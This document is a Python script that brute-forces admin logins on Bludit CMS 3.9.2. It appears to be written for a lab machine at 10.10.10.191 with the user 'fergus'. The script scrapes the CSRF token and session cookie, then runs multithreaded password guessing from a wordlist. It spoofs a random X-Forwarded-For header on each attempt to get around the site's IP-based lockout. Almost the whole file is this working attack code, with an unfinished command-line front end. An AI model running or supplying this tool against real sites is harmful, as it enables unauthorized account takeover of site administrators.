#!/usr/bin/env python3

import os
import random
from re import search as research
from http import client
from time import sleep
import itertools
import threading
import argparse


def banner():
    print("No banner yet")

def argument_parser():
    parser = argparse.ArgumentParser(prog="bludit_3.9.2-bruteforce.py",
                                     usage="./bludit_3.9.2-brutefoce.py [--path|-p|-t|-T] {-s} {-U} {-P}")
    parser.add_argument("--host",default="localhost",type=str,required=True,help="specify server to connect",metavar="")
    parser.add_argument("--path",default="/bludit/admin",type=str,help="specify bludit login path... default[/bludit/admin/]",metavar="")
    parser.add_argument("-p","--port",default=80,type=int,help="specify port...  Default[p:80]",metavar="")
    parser.add_argument("-U","--username",type=str,required=True,help="specify username. It can be a username or a path",metavar="")
    parser.add_argument("-P","--password",type=str,required=True,help="specify password. It can be a password or a path",metavar="")
    parser.add_argument("-t","--threads",type=int,help="specify threads... Default[t:1]",metavar="")
    parser.add_argument("-T","--timeout",type=int,help="specify timeout in seconds... Default[30]",metavar="")
    args = parser.parse_args()
    return args

def argument_checker(args):
    wordlistpair = argument_checker_wordlist(args.username,args.password)
    print(wordlistpair)
    exit()
    
    HTTPHandler = client.HTTPConnection(args.host,args.port)
    HTTPHandler.connect()
    HTTPHandler,cookie,token = argument_checker_host(HTTPHandler,args.host,args.path)

def argument_checker_wordlist(username,password):    
    wordlistpair = [username,password]
    for i in range(2):
        if type(wordlistpair[i]) == list:
            continue
        if os.path.isfile(wordlistpair[i]):
            wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
        wordlistpair[i] = wordlistpair[i].split("\n")
    return wordlistpair

def argument_checker_host(HTTPHandler,host,path):
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "Connection":"KeepAlive",
        }
    HTTPHandler.request("GET",path,headers=header)
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_host","host seems down")

    try:
        token = research('input.+?name="tokenCSRF".+?value="(.+?)"', response.read().decode()).group(1)
        cookie = response.getheader("Set-Cookie").split(";")[0]
    except:
        ERROR("argument_checker_host","bludit cookie and token doesn't found")

    return HTTPHandler,cookie,token

def ERROR(msg1,msg2):
    """
    msg1 = location
    msg2 = reason
    """
    print("==================")
    print("#### ERROR #######")
    print("[X] {}".format(msg1))
    print("[X] {}".format(msg2))
    print("==================")
    exit()

    
if __name__ == "__main__":
    banner()
    args = argument_parser()
    argument_checker(args)
    exit()
                        

# this program was tested only in bludit v3.9.2

server = "10.10.10.191"
port = 80
path = "/admin/"  # Path of the bludit login
# user and pass can be a simple word, a list or a path to a dictionary
# warning: using large files can freeze your box. Experience talking
userwordlist = ["fergus"]
passwordlist = "wordlist.txt"
threads = 100  # Elevated use of threads may need a greather timeout
timeout = 60
errmsg = "Username or password incorrect"  # error message in case of incorrect login attempt

# Leave this variables empty
credentials = "" 
attempts = 0
percent = 0
total = 0

wordlistpair = [userwordlist, passwordlist]
for i in range(2):
    if type(wordlistpair[i]) == list:
        continue
    if os.path.isfile(wordlistpair[i]):
        wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
    wordlistpair[i] = wordlistpair[i].split("\n")

    
def random_ip_generator():
    return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
                                random.randint(10,255), random.randint(10,255))

def get_cookie_N_token(HTTPHandler, head:dict, path):
    """ return cookie and token from the page """
    HTTPHandler.request("GET",path,headers=head)
    response = HTTPHandler.getresponse()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',response.read().decode()).group(1)
    cookie = research('BLUDIT-KEY=[a-zA-Z0-9]*',response.getheader('Set-Cookie')).group(0)
    return token,cookie


def POST_request(HTTPHandler, head:dict, data, path):
    """ try to loging, if sucess return true, else return token to keep trying"""
    HTTPHandler.request("POST",path,body=data,headers=head)
    response = HTTPHandler.getresponse()
    info = response.read().decode()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info)

    if research(errmsg,info) == None:
        return True
    elif token == None:
        print("\n[!] No token found...")
        return False
    else:
        token = token.group(1)
        return token

    
def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):
    global credentials,percent,attempts,total
    HTTPHandler = client.HTTPConnection(server,port,timeout)
    HTTPHandler.connect()
    header = {
        "Host":server,
        "User-Agent":"GoogleBot",
        "Connection":"keep-alive"
    }
    try:
        token,cookie = get_cookie_N_token(HTTPHandler,header,path)
    except:
        print("[X] Unable to connect ")
        credentiales = False
        exit()
    for password in passwordlist:
        if len(credentials) > 0:
            exit()
        bodydata="tokenCSRF={}&username={}&password={}&save=".format(token,username,password)    
        header = {
            "Host":server,
            "User-Agent":"GoogleBot",
            "X-Forwarded-For":random_ip_generator(),
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"{}".format(len(bodydata)),
            "DNT":"1",
            "Connection":"close",
            "Cookie":cookie,
        }
        print(" %03d %03d %08d  | %s:%-40s"%(threading.active_count(),percent,attempts,username,password),end="\r")
        attempts += 1
        percent = (attempts*100)//total
        try:
            token = POST_request(HTTPHandler,header,bodydata,path)
        except:
            print("[*] Error: %s:%s%40s"%(username,password," "))
            break
            
        if token == True:
            print(f"\n\n[!] FOUND: {username}:{password}")
            credentials = "{}:{}".format(username,password)
            exit()
        elif token == False:
            print("[*] Unable to get token...")
        else:
            continue

    HTTPHandler.close()

pswdict = dict()
aux1 = aux2 = aux3 = 0
width = (len(wordlistpair[1])-1)//threads
for i in itertools.count(width,width):  # dividing pass wordlist per threads
    if i >= (len(wordlistpair[1])-1):
        i = i-(i-(len(wordlistpair[1])-1))
        aux3 = 1
    pswdict[aux1] = wordlistpair[1][aux2:i]
    aux1 += 1
    aux2 = i
    if aux3 == 1:
        break
del aux1,aux2,aux3,width

print(" %-3s %-3s %-8s  | %9s"%("Thr","Per","Attempts","User/Pass"))

total = len(wordlistpair[1]) - 1

for user in wordlistpair[0]:
    attempts = 0
    for pswr in pswdict.keys():
        x = threading.Thread(target=MainFunction, args=(user,pswdict[pswr],server,port,timeout,path))
        x.start()
    try:
        while threading.active_count() > 1:
            sleep(3)
    except:
        credentials="FALSE"
        
print("\n[*] Finished...")


